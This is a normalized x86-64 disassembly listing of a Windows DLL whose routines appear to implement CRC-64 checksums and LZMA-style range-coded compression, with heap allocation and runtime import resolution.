sub_180001040
mov r9 rcx
test rcx rcx
je r-xdata
xor eax eax
retn
cmp edx 0x1
jb r-xdata
cmp [ rw-data ] 0x0
je r-xdata
or r8 0xffffffffffffffff
mov r10d edx
test edx edx
je r-xdata
not r8
mov rax r8
retn
lea r11 [ rw-data ]
nop [ rax + rax ] eax
movzx eax [ r9 ]
mov rcx r8
inc r9
xor rax r8
shr rcx 0x8
movzx edx al
mov r8 [ r11 + rdx * 8 ]
xor r8 rcx
dec r10
jne r-xdata
sub_1800010a0
push rbx
sub rsp 0x20
mov rbx r9
mov r10 r8
test rcx rcx
je r-xdata
mov eax 0x5
add rsp 0x20
pop rbx
retn
cmp edx 0x1
jb r-xdata
test rbx rbx
je r-xdata
test r8 r8
je r-xdata
mov eax [ r9 ]
mov r9d edx
mov r8 rcx
lea rdx [ rsp + 0x30 ]
mov rcx r10
mov [ rsp + 0x30 ] rax
call sub_180001410
mov ecx [ rsp + 0x30 ]
mov [ rbx ] ecx
add rsp 0x20
pop rbx
retn
sub_180001100
mov r11 rsp
push rbp
push rdi
push r13
sub rsp 0x120
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rbp r9
mov r13 r8
mov rdi rdx
mov [ rsp + 0x40 ] rcx
test rcx rcx
je r-xdata
mov eax 0x5
test rdx rdx
je r-xdata
mov eax [ rdx ]
cmp eax 0x1
jb r-xdata
test r9 r9
je r-xdata
test r8 r8
je r-xdata
mov [ r11 - 0x20 ] rbx
mov [ r11 - 0x28 ] rsi
mov [ r11 - 0x30 ] r12
mov [ r11 - 0x38 ] r14
mov r14d eax
xor eax eax
mov [ r11 - 0x40 ] r15
mov r15d [ r9 ]
mov r12d eax
mov esi eax
cmp r14 0x5
jae r-xdata
mov edx [ rw-data ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x60 ] rax
call sub_180007490
mov ebx eax
test eax eax
jne r-xdata
lea ebx [ rax + 0x6 ]
jmp r-xdata
xor eax eax
mov r8 [ rsp + 0x40 ]
xor eax eax
lea r9 [ rsp + 0x38 ]
mov [ rsp + 0x80 ] rax
mov [ rsp + 0xac ] eax
mov [ rsp + 0xbc ] eax
mov [ rsp + 0x90 ] rax
lea rax [ rsp + 0x30 ]
lea rcx [ rsp + 0x50 ]
mov rdx r15
mov [ rsp + 0x68 ] r13
mov [ rsp + 0x88 ] r15
mov [ rsp + 0x20 ] rax
mov [ rsp + 0xb0 ] 0x1
mov [ rsp + 0xb4 ] 0x1
mov [ rsp + 0x38 ] r14
call sub_1800071f0
mov ebx eax
test eax eax
jne r-xdata
mov r15 [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
cmp ebx 0x6
jne r-xdata
mov [ rbp ] r12d
mov r12 [ rsp + 0x108 ]
mov eax ebx
mov rbx [ rsp + 0x118 ]
mov [ rdi ] esi
mov rsi [ rsp + 0x110 ]
jmp r-xdata
mov ecx [ rdi ]
cmp rsi rcx
cmove ebx eax
mov rdx [ rsp + 0x60 ]
mov r12 [ rsp + 0x80 ]
lea rcx [ rw-data ]
call [ rw-data ]
mov rsi [ rsp + 0x38 ]
cmp [ rsp + 0x30 ] 0x3
mov ebx 0x6
cmove eax ebx
mov ebx eax
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_18000c060
add rsp 0x120
pop r13
pop rdi
pop rbp
retn
sub_1800012b0
xor edx edx
lea r8 [ rw-data ]
mov r9d 0x100
mov r10 0xc96c5795d7870f42
nop [ rax ] eax
mov rcx rdx
mov rax rdx
add r8 0x8
shr rax 0x1
and ecx 0x1
inc rdx
dec rcx
not rcx
and rcx r10
xor rcx rax
mov rax rcx
shr rcx 0x1
and eax 0x1
dec rax
not rax
and rax r10
xor rax rcx
mov rcx rax
shr rax 0x1
and ecx 0x1
dec rcx
not rcx
and rcx r10
xor rcx rax
mov rax rcx
shr rcx 0x1
and eax 0x1
dec rax
not rax
and rax r10
xor rax rcx
mov rcx rax
shr rax 0x1
and ecx 0x1
dec rcx
not rcx
and rcx r10
xor rcx rax
mov rax rcx
shr rcx 0x1
and eax 0x1
dec rax
not rax
and rax r10
xor rax rcx
mov rcx rax
shr rax 0x1
and ecx 0x1
dec rcx
not rcx
and rcx r10
xor rcx rax
mov rax rcx
shr rcx 0x1
and eax 0x1
dec rax
not rax
and rax r10
xor rax rcx
dec r9
mov [ r8 - 0x8 ] rax
jne r-xdata
retn
sub_1800013a0
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
jne r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov edx 0x8
mov rcx rax
add rsp 0x20
pop rbx
jmp [ HeapAlloc@IAT ]
xor eax eax
add rsp 0x20
pop rbx
retn
sub_180001410
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push r12
push r13
sub rsp 0x60
mov r13 rcx
mov r12 rdx
xor eax eax
lea rcx [ rw-data ]
mov edx 0x46d08
mov rsi r9
mov rbp r8
mov [ rsp + 0x4c ] 0xffffffffffffffff
mov [ rsp + 0x44 ] 0xffffffff
mov [ rsp + 0x54 ] rax
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x34 ] 0x100000
mov [ rsp + 0x38 ] 0x3
mov [ rsp + 0x40 ] 0x2
mov [ rsp + 0x48 ] 0x20
mov [ rsp + 0x5c ] 0x1
call [ rw-data ]
mov rbx rax
test rax rax
je r-xdata
mov eax 0x2
mov rcx rax
mov [ rsp + 0x80 ] rdi
call sub_1800047a0
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_1800016b0
mov edi eax
test eax eax
jne r-xdata
mov rcx rbx
call sub_180004980
lea rcx [ rw-data ]
mov rdx rbx
call [ rw-data ]
mov eax edi
mov rdi [ rsp + 0x80 ]
jmp r-xdata
mov rcx rbx
call sub_180005a40
mov edi eax
test eax eax
jne r-xdata
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rsi
retn
mov r9 rbp
mov r8 r12
mov rdx r13
mov rcx rbx
mov [ rsp + 0x20 ] rsi
call sub_180005af0
mov edi eax
sub_180001520
push rbx
sub rsp 0x20
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov rbx rax
test rax rax
jne r-xdata
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
mov eax 0x1
add rsp 0x20
pop rbx
retn
add rsp 0x20
pop rbx
retn
sub_1800015b0
mov r8d [ rcx ]
mov eax 0x5
mov rdx rcx
test r8d r8d
cmovs r8d eax
cmp [ rcx + 0x4 ] 0x0
mov [ rcx ] r8d
jne r-xdata
mov eax [ rdx + 0x8 ]
mov ecx 0x3
mov r9d 0x2
cmp eax 0x0
cmovl eax ecx
xor ecx ecx
mov [ rdx + 0x8 ] eax
mov eax [ rdx + 0xc ]
cmp eax ecx
cmovl eax ecx
mov [ rdx + 0xc ] eax
mov eax [ rdx + 0x10 ]
cmp eax ecx
cmovl eax r9d
mov [ rdx + 0x10 ] eax
cmp [ rdx + 0x14 ] ecx
jge r-xdata
cmp r8d eax
jg r-xdata
cmp [ rdx + 0x18 ] ecx
jge r-xdata
mov eax ecx
cmp r8d 0x5
setge al
mov [ rdx + 0x14 ] eax
mov eax 0x4000000
mov ecx 0x2000000
cmp r8d 0x6
cmove eax ecx
lea ecx [ r8 + r8 + 0xe ]
mov eax 0x1
shl eax cl
jmp r-xdata
cmp [ rdx + 0x1c ] ecx
jge r-xdata
mov eax 0x40
mov r10d 0x20
cmp r8d 0x7
cmovl eax r10d
mov [ rdx + 0x18 ] eax
mov [ rdx + 0x4 ] eax
mov eax [ rdx + 0x20 ]
mov r8d 0x4
cmp eax ecx
cmovl eax r8d
mov [ rdx + 0x20 ] eax
cmp [ rdx + 0x24 ] ecx
jne r-xdata
cmp [ rdx + 0x14 ] ecx
mov eax ecx
setne al
mov [ rdx + 0x1c ] eax
cmp [ rdx + 0x2c ] 0x0
jge r-xdata
cmp [ rdx + 0x1c ] ecx
mov eax [ rdx + 0x18 ]
sete cl
sar eax 0x1
add eax 0x10
sar eax cl
mov [ rdx + 0x24 ] eax
retn
cmp [ rdx + 0x1c ] 0x0
je r-xdata
mov r9d 0x1
cmp [ rdx + 0x14 ] 0x0
jne r-xdata
mov [ rdx + 0x2c ] r9d
sub_1800016b0
push rbx
sub rsp 0x50
mov rbx rcx
lea rcx [ rsp + 0x20 ]
mov r8d 0x30
call sub_18000c440
lea rcx [ rsp + 0x20 ]
call sub_1800015b0
mov r11d [ rsp + 0x28 ]
cmp r11d 0x8
jg r-xdata
mov eax 0x5
add rsp 0x50
pop rbx
retn
mov ecx [ rsp + 0x2c ]
cmp ecx 0x4
jg r-xdata
mov edx [ rsp + 0x30 ]
cmp edx 0x4
jg r-xdata
mov eax [ rsp + 0x24 ]
cmp eax 0x80000000
ja r-xdata
cmp eax 0x40000000
ja r-xdata
mov r8d [ rsp + 0x44 ]
mov [ rbx + 0x3d5e8 ] eax
mov eax [ rsp + 0x38 ]
mov [ rbx + 0x3d5ec ] r8d
cmp eax 0x5
jae r-xdata
mov r9d 0x111
cmp eax r9d
cmova eax r9d
mov eax 0x5
jmp r-xdata
cmp [ rsp + 0x4c ] 0x1
mov eax [ rsp + 0x48 ]
mov [ rbx + 0x2a8 ] ecx
setg dl
mov [ rbx + 0x3d5c8 ] eax
mov [ rbx + 0x284 ] r8d
mov [ rbx + 0x3d5e0 ] edx
xor eax eax
add rsp 0x50
pop rbx
retn
mov eax [ rsp + 0x40 ]
cmp eax 0x2
jge r-xdata
mov [ rbx + 0x33200 ] eax
mov [ rbx + 0x33e6c ] edx
xor edx edx
cmp [ rsp + 0x34 ] edx
mov eax edx
mov [ rbx + 0x33e68 ] ecx
sete al
mov [ rbx + 0x33e64 ] r11d
lea ecx [ rdx + 0x4 ]
mov [ rbx + 0x3d578 ] eax
mov eax [ rsp + 0x3c ]
mov [ rbx + 0x2b8 ] eax
test eax eax
je r-xdata
cmp eax ecx
cmovl ecx eax
lea ecx [ rdx + 0x2 ]
jmp r-xdata
sub_1800017d0
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx [ rcx + 0x8 ]
cmp ecx 0xff000000
jb r-xdata
movzx ecx [ rbx + 0x4 ]
mov [ rsp + 0x30 ] rdi
nop [ rax ] eax
mov rax [ rbx + 0x8 ]
shr rax 0x20
test eax eax
je r-xdata
dec [ rbx + 0x10 ]
mov cl 0xff
jne r-xdata
cmp [ rbx + 0x40 ] 0x0
jne r-xdata
inc [ rbx + 0x10 ]
shl ecx 0x8
mov eax ecx
mov [ rbx + 0x8 ] rax
add rsp 0x20
pop rbx
retn
mov rdi [ rbx + 0x18 ]
mov rax [ rbx + 0x8 ]
shr rax 0x20
inc rdi
add al cl
mov [ rdi - 0x1 ] al
mov [ rbx + 0x18 ] rdi
cmp rdi [ rbx + 0x20 ]
jne r-xdata
mov ecx [ rbx + 0x8 ]
mov rdi [ rsp + 0x30 ]
mov eax ecx
shr eax 0x18
mov [ rbx + 0x4 ] al
mov rdx [ rbx + 0x28 ]
mov rax [ rbx + 0x30 ]
sub rdi rdx
mov rcx rax
mov r8 rdi
call [ rax ]
cmp rdi rax
je r-xdata
mov rax [ rbx + 0x28 ]
add [ rbx + 0x38 ] rdi
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x40 ] 0x9
sub_180001880
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
mov esi 0x5
nop [ rax + rax ] ax
movzx ecx [ rbx + 0x4 ]
nop [ rax + rax ] eax
mov rax [ rbx + 0x8 ]
shr rax 0x20
test eax eax
je r-xdata
dec [ rbx + 0x10 ]
mov cl 0xff
jne r-xdata
cmp [ rbx + 0x40 ] 0x0
jne r-xdata
inc [ rbx + 0x10 ]
shl ecx 0x8
dec rsi
mov eax ecx
mov [ rbx + 0x8 ] rax
jne r-xdata
mov rdi [ rbx + 0x18 ]
mov rax [ rbx + 0x8 ]
shr rax 0x20
inc rdi
add al cl
mov [ rdi - 0x1 ] al
mov [ rbx + 0x18 ] rdi
cmp rdi [ rbx + 0x20 ]
jne r-xdata
mov ecx [ rbx + 0x8 ]
mov eax ecx
shr eax 0x18
mov [ rbx + 0x4 ] al
mov rdx [ rbx + 0x28 ]
mov rax [ rbx + 0x30 ]
sub rdi rdx
mov rcx rax
mov r8 rdi
call [ rax ]
cmp rdi rax
je r-xdata
mov ecx [ rbx + 0x8 ]
cmp ecx 0xff000000
jb r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx + 0x28 ]
add [ rbx + 0x38 ] rdi
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x40 ] 0x9
sub_180001950
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov esi r8d
mov ebp edx
mov rbx rcx
nop [ rax ] eax
test esi esi
jne r-xdata
mov ecx [ rbx + 0x8 ]
shl r9d 0x8
mov [ rbx ] r9d
cmp ecx 0xff000000
jb r-xdata
shr [ rbx ] 0x1
mov r9d [ rbx ]
dec esi
mov eax ebp
mov ecx esi
shr eax cl
and eax 0x1
neg eax
and rax r9
add [ rbx + 0x8 ] rax
cmp r9d 0x1000000
jae r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
movzx ecx [ rbx + 0x4 ]
nop [ rax + rax ] eax
mov rax [ rbx + 0x8 ]
shr rax 0x20
test eax eax
je r-xdata
dec [ rbx + 0x10 ]
mov cl 0xff
jne r-xdata
cmp [ rbx + 0x40 ] 0x0
jne r-xdata
inc [ rbx + 0x10 ]
shl ecx 0x8
mov eax ecx
mov [ rbx + 0x8 ] rax
mov rdi [ rbx + 0x18 ]
mov rax [ rbx + 0x8 ]
shr rax 0x20
inc rdi
add al cl
mov [ rdi - 0x1 ] al
mov [ rbx + 0x18 ] rdi
cmp rdi [ rbx + 0x20 ]
jne r-xdata
mov ecx [ rbx + 0x8 ]
mov eax ecx
shr eax 0x18
mov [ rbx + 0x4 ] al
mov rdx [ rbx + 0x28 ]
mov rax [ rbx + 0x30 ]
sub rdi rdx
mov rcx rax
mov r8 rdi
call [ rax ]
cmp rdi rax
je r-xdata
mov rax [ rbx + 0x28 ]
add [ rbx + 0x38 ] rdi
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x40 ] 0x9
sub_180001a50
sub rsp 0x28
mov r11d [ rcx ]
movzx r9d [ rdx ]
mov r10d r11d
shr r10d 0xb
imul r10d r9d
test r8d r8d
jne r-xdata
mov eax r10d
sub r11d r10d
add [ rcx + 0x8 ] rax
mov eax r9d
mov [ rcx ] r11d
shr eax 0x5
sub r9d eax
mov eax 0x800
mov [ rcx ] r10d
sub eax r9d
shr eax 0x5
add r9d eax
jmp r-xdata
add rsp 0x28
retn
shl eax 0x8
mov [ rcx ] eax
call sub_1800017d0
mov [ rdx ] r9w
mov eax [ rcx ]
cmp eax 0x1000000
jae r-xdata
sub_180001ab0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov ebx r8d
mov rsi rdx
mov rdi rcx
bts ebx 0x8
nop [ rax ] eax
mov eax edx
sub r9d edx
add [ rdi + 0x8 ] rax
mov eax ecx
mov [ rdi ] r9d
shr eax 0x5
sub ecx eax
mov eax 0x800
mov [ rdi ] edx
sub eax ecx
shr eax 0x5
add ecx eax
jmp r-xdata
add ebx ebx
cmp ebx 0x10000
jb r-xdata
shl eax 0x8
mov rcx rdi
mov [ rdi ] eax
call sub_1800017d0
mov [ rsi + r8 * 2 ] cx
mov eax [ rdi ]
cmp eax 0x1000000
jae r-xdata
mov r9d [ rdi ]
mov r8d ebx
shr r8 0x8
mov edx r9d
movzx ecx [ rsi + r8 * 2 ]
shr edx 0xb
imul edx ecx
test bl bl
js r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180001b50
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov edi r8d
mov esi 0x100
mov ebp r9d
mov r12 rdx
mov rbx rcx
or edi esi
nop [ rax ] eax
mov eax edx
sub r8d edx
add [ rbx + 0x8 ] rax
mov eax ecx
mov [ rbx ] r8d
shr eax 0x5
sub ecx eax
mov eax 0x800
mov [ rbx ] edx
sub eax ecx
shr eax 0x5
add ecx eax
jmp r-xdata
add edi edi
mov eax edi
xor eax ebp
not eax
and esi eax
cmp edi 0x10000
jb r-xdata
shl eax 0x8
mov rcx rbx
mov [ rbx ] eax
call sub_1800017d0
mov [ r12 + r9 * 2 ] cx
mov eax [ rbx ]
cmp eax 0x1000000
jae r-xdata
mov r8d [ rbx ]
add ebp ebp
mov edx edi
shr edx 0x8
mov eax esi
and eax ebp
add eax esi
add edx eax
mov r9d edx
movzx ecx [ r12 + rdx * 2 ]
mov edx r8d
shr edx 0xb
imul edx ecx
test dil dil
js r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
sub_180001c20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
mov rdi r9
mov r10d edx
mov r9d 0x100
xor r11d r11d
mov ebx r8d
mov rsi rcx
or r10d r9d
nop [ rax + rax ] ax
add ebx ebx
mov r8d r10d
mov ecx r10d
shr ecx 0x7
shr r8d 0x8
mov eax r9d
and ecx 0x1
and eax ebx
add r10d r10d
neg ecx
add eax r9d
sar rcx 0x4
add r8d eax
movzx edx [ rsi + r8 * 2 ]
and ecx 0x7f
shr rdx 0x4
xor rdx rcx
mov ecx r10d
add r11d [ rdi + rdx * 4 ]
xor ecx ebx
not ecx
and r9d ecx
cmp r10d 0x10000
jb r-xdata
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov rdi [ rsp + 0x18 ]
mov eax r11d
retn
sub_180001cb0
test r8d r8d
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov r13d r9d
mov esi r8d
mov r12 rdx
mov rbx rcx
mov edi 0x1
mov [ rsp + 0x40 ] rbp
mov eax edx
sub r8d edx
add [ rbx + 0x8 ] rax
mov eax ecx
mov [ rbx ] r8d
shr eax 0x5
sub ecx eax
mov eax 0x800
mov [ rbx ] edx
sub eax ecx
shr eax 0x5
add ecx eax
jmp r-xdata
add edi edi
or edi ebp
test esi esi
jne r-xdata
shl eax 0x8
mov rcx rbx
mov [ rbx ] eax
call sub_1800017d0
mov [ r12 + r9 * 2 ] cx
mov eax [ rbx ]
cmp eax 0x1000000
jae r-xdata
mov r8d [ rbx ]
dec esi
mov ebp r13d
mov ecx esi
mov r9d edi
mov edx r8d
shr ebp cl
movzx ecx [ r12 + r9 * 2 ]
shr edx 0xb
imul edx ecx
and ebp 0x1
jne r-xdata
mov rbp [ rsp + 0x40 ]
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
sub_180001d70
test r8d r8d
jle r-xdata
retn
mov [ rsp + 0x18 ] rbx
push rsi
push rdi
push r13
sub rsp 0x20
mov [ rsp + 0x40 ] rbp
mov esi r9d
mov r13 rdx
mov [ rsp + 0x48 ] r12
mov ebp r8d
mov rbx rcx
mov edi 0x1
mov eax edx
sub r8d edx
add [ rbx + 0x8 ] rax
mov eax ecx
mov [ rbx ] r8d
shr eax 0x5
sub ecx eax
mov eax 0x800
mov [ rbx ] edx
sub eax ecx
shr eax 0x5
add ecx eax
jmp r-xdata
add edi edi
shr esi 0x1
or edi r12d
dec rbp
jne r-xdata
shl eax 0x8
mov rcx rbx
mov [ rbx ] eax
call sub_1800017d0
mov [ r13 + r9 * 2 ] cx
mov eax [ rbx ]
cmp eax 0x1000000
jae r-xdata
mov r8d [ rbx ]
mov r9d edi
mov r12d esi
movzx ecx [ r13 + r9 * 2 ]
mov edx r8d
shr edx 0xb
imul edx ecx
and r12d 0x1
jne r-xdata
mov r12 [ rsp + 0x48 ]
mov rbp [ rsp + 0x40 ]
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop rdi
pop rsi
sub_180001e30
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push r12
push r13
push r14
sub rsp 0x20
mov r13d r9d
mov r14d r8d
mov rbx rdx
mov rsi rcx
cmp r8d 0x8
jae r-xdata
movzx r8d [ rcx ]
mov edx [ rdx ]
mov ecx edx
shr ecx 0xb
imul ecx r8d
mov eax ecx
sub edx ecx
add [ rbx + 0x8 ] rax
mov eax r8d
mov [ rbx ] edx
shr eax 0x5
sub r8w ax
mov [ rsi ] r8w
mov eax [ rbx ]
cmp eax 0x1000000
jae r-xdata
movzx r10d [ rcx ]
mov eax [ rdx ]
mov ebp 0x800
shr eax 0xb
mov [ rsp + 0x50 ] rdi
mov [ rsp + 0x58 ] r15
imul eax r10d
mov [ rdx ] eax
mov eax ebp
sub eax r10d
shr eax 0x5
add ax r10w
mov [ rcx ] ax
mov eax [ rdx ]
cmp eax 0x1000000
jae r-xdata
cmp r14d 0x10
jae r-xdata
shl eax 0x8
mov rcx rbx
mov [ rbx ] eax
call sub_1800017d0
mov edi 0x1
mov r12d 0x3
lea r15d [ r13 * 8 ]
nop [ rax ] eax
shl eax 0x8
mov rcx rdx
mov [ rdx ] eax
call sub_1800017d0
movzx r8d [ rsi + 0x2 ]
mov edx [ rbx ]
mov ecx edx
shr ecx 0xb
imul ecx r8d
mov eax ecx
sub edx ecx
add [ rbx + 0x8 ] rax
mov eax r8d
mov [ rbx ] edx
shr eax 0x5
sub r8w ax
mov [ rsi + 0x2 ] r8w
mov eax [ rbx ]
cmp eax 0x1000000
jae r-xdata
movzx ecx [ rsi + 0x2 ]
mov eax [ rbx ]
mov ebp 0x800
shr eax 0xb
sub ebp ecx
shr ebp 0x5
add bp cx
imul eax ecx
mov [ rbx ] eax
mov [ rsi + 0x2 ] bp
mov eax [ rbx ]
cmp eax 0x1000000
jae r-xdata
mov eax edx
sub r8d edx
add [ rbx + 0x8 ] rax
mov eax ecx
mov [ rbx ] r8d
shr eax 0x5
sub ecx eax
mov eax ebp
mov [ rbx ] edx
sub eax ecx
shr eax 0x5
add ecx eax
jmp r-xdata
lea r9d [ r14 - 0x10 ]
lea rdx [ rsi + 0x204 ]
mov r8d 0x8
shl eax 0x8
mov rcx rbx
mov [ rbx ] eax
call sub_1800017d0
lea eax [ r13 * 8 ]
lea r9d [ r14 - 0x8 ]
mov r8d 0x3
lea rdx [ rsi + rax * 2 + 0x104 ]
jmp r-xdata
shl eax 0x8
mov rcx rbx
mov [ rbx ] eax
call sub_1800017d0
add edi edi
or edi r13d
test r12d r12d
jne r-xdata
shl eax 0x8
mov rcx rbx
mov [ rbx ] eax
call sub_1800017d0
mov [ rsi + r9 * 2 + 0x4 ] cx
mov eax [ rbx ]
cmp eax 0x1000000
jae r-xdata
mov rcx rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rsi
pop rbp
jmp sub_180001cb0
mov r8d [ rbx ]
dec r12d
mov r9d edi
mov ecx r12d
add r9 r15
mov r13d r14d
shr r13d cl
movzx ecx [ rsi + r9 * 2 + 0x4 ]
mov edx r8d
shr edx 0xb
imul edx ecx
and r13d 0x1
jne r-xdata
mov r15 [ rsp + 0x58 ]
mov rdi [ rsp + 0x50 ]
mov rbx [ rsp + 0x60 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rsi
pop rbp
retn
sub_180002040
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
push r15
mov r11 [ rsp + 0x48 ]
movzx r10d [ rcx ]
mov r12d r8d
movzx r8d [ rcx + 0x2 ]
mov eax r10d
mov r15 r9
shr rax 0x4
xor r10 0x7f0
mov r13d edx
mov ebp [ r11 + rax * 4 ]
mov eax r8d
shr r10 0x4
mov r9d [ r11 + r10 * 4 ]
shr rax 0x4
xor r8 0x7f0
mov eax [ r11 + rax * 4 ]
shr r8 0x4
mov rbx rcx
lea r14d [ r9 + rax ]
mov eax [ r11 + r8 * 4 ]
mov rsi r15
add eax r9d
xor r9d r9d
mov [ rsp + 0x48 ] eax
nop [ rax + rax ] eax
mov rbx [ rsp + 0x28 ]
mov rbp [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
pop r15
pop r14
pop r13
pop r12
retn
mov r8d r9d
xor r10d r10d
or r8d 0x8
cmp r8d 0x1
je r-xdata
lea eax [ r10 + rbp ]
inc r9d
add rsi 0x4
mov [ rsi - 0x4 ] eax
cmp r9d 0x8
jb r-xdata
lea edi [ r13 * 8 ]
cmp r9d r12d
jae r-xdata
movsxd rax r9d
cmp r9d 0x10
jae r-xdata
mov ecx r8d
mov eax r8d
shr r8d 0x1
and ecx 0x1
shr rax 0x1
neg ecx
add rax rdi
movzx edx [ rbx + rax * 2 + 0x4 ]
sar rcx 0x4
shr rdx 0x4
and ecx 0x7f
xor rdx rcx
add r10d [ r11 + rdx * 4 ]
cmp r8d 0x1
jne r-xdata
movsxd rax r9d
cmp r9d r12d
jae r-xdata
lea esi [ r9 - 0x8 ]
lea rbp [ r15 + rax * 4 ]
mov ebp [ rsp + 0x48 ]
sub r12d r9d
lea r10d [ r9 - 0x10 ]
mov esi r12d
lea rdi [ r15 + rax * 4 ]
nop [ rax + rax ] ax
mov r8d esi
xor r10d r10d
or r8d 0x8
cmp r8d 0x1
je r-xdata
lea eax [ r9 + rbp ]
add rdi 0x4
inc r10d
dec rsi
mov [ rdi - 0x4 ] eax
jne r-xdata
mov ecx r8d
mov eax r8d
shr r8d 0x1
and ecx 0x1
shr rax 0x1
movzx edx [ rbx + rax * 2 + 0x204 ]
neg ecx
sar rcx 0x4
shr rdx 0x4
and ecx 0x7f
xor rdx rcx
add r9d [ r11 + rdx * 4 ]
cmp r8d 0x1
jne r-xdata
lea eax [ r10 + r14 ]
inc r9d
add rbp 0x4
mov [ rbp - 0x4 ] eax
inc esi
cmp r9d 0x10
jb r-xdata
lea edi [ r13 * 8 ]
nop [ rax + rax ] eax
mov r8d r10d
xor r9d r9d
bts r8d 0x8
cmp r8d 0x1
je r-xdata
cmp r9d r12d
jae r-xdata
mov ecx r8d
mov eax r8d
shr r8d 0x1
and ecx 0x1
shr rax 0x1
neg ecx
add rax rdi
movzx edx [ rbx + rax * 2 + 0x104 ]
sar rcx 0x4
shr rdx 0x4
and ecx 0x7f
xor rdx rcx
add r10d [ r11 + rdx * 4 ]
cmp r8d 0x1
jne r-xdata
sub_180002250
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov esi r9d
mov rdi rcx
call sub_180001e30
cmp [ rsp + 0x60 ] 0x0
je r-xdata
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov [ rsp + 0x40 ] rbx
lea rbx [ rdi + rsi * 4 + 0x4808 ]
mov eax esi
dec [ rbx ]
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov r8d [ rdi + 0x4804 ]
imul rax rax 0x440
mov edx esi
lea r9 [ rax + rdi + 0x404 ]
mov rax [ rsp + 0x68 ]
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_180002040
mov r11d [ rdi + 0x4804 ]
mov [ rbx ] r11d
sub_1800022d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
mov rcx [ rcx + 0x30 ]
mov rbp rdx
xor ebx ebx
call [ rdi + 0x10 ]
mov rcx [ rdi + 0x30 ]
lea rdx [ rdi + 0x3296c ]
mov [ rdi + 0x768 ] eax
call [ rdi + 0x20 ]
mov esi eax
test eax eax
je r-xdata
inc [ rdi + 0x33204 ]
mov [ rbp ] esi
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax - 0x2 ]
movsxd rbx [ rdi + rcx * 4 + 0x3296c ]
cmp ebx [ rdi + 0x33200 ]
jne r-xdata
mov rcx [ rdi + 0x30 ]
call [ rdi + 0x18 ]
mov r9d [ rdi + 0x768 ]
lea ecx [ rsi - 0x1 ]
mov ecx [ rdi + rcx * 4 + 0x3296c ]
lea r11 [ rax - 0x1 ]
mov eax 0x111
inc ecx
cmp r9d eax
mov r8 r11
cmova r9d eax
mov eax ecx
sub r8 rax
cmp ebx r9d
jae r-xdata
lea rdx [ rbx + r11 ]
sub r8 r11
nop
inc ebx
inc rdx
cmp ebx r9d
jb r-xdata
movzx ecx [ r8 + rdx ]
cmp [ rdx ] cl
jne r-xdata
